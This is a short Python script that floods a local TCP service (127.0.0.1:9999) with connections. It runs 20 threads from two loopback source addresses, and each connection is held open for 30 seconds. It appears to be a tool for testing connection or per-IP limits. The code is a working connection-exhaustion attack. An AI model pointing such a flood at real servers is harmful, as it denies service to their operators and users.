import socket
import threading
import time

TARGET_IP = '127.0.0.1'
TARGET_PORT = 9999
NUM_THREADS = 20
CONNECTIONS_PER_THREAD = 5

SOURCE_IPS = ['127.0.0.2', '127.0.0.3']

def flood_connections(source_ip):
    """Open connections from a specific source IP."""
    for _ in range(CONNECTIONS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((source_ip, 0))
            s.connect((TARGET_IP, TARGET_PORT))
            source_port = s.getsockname()[1]
            print(f"[+] Connection from {source_ip}:{source_port} to {TARGET_IP}:{TARGET_PORT}")
            time.sleep(30)
        except Exception as e:
            print(f"[!] Failed to connect from {source_ip}: {e}")

def start_flood():
    threads = []
    for i in range(NUM_THREADS):
        source_ip = SOURCE_IPS[i % len(SOURCE_IPS)]
        thread = threading.Thread(target=flood_connections, args=(source_ip,))
        threads.append(thread)
        thread.start()
        print(f"[*] Started thread {i + 1}/{NUM_THREADS} from {source_ip}")

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    start_flood()
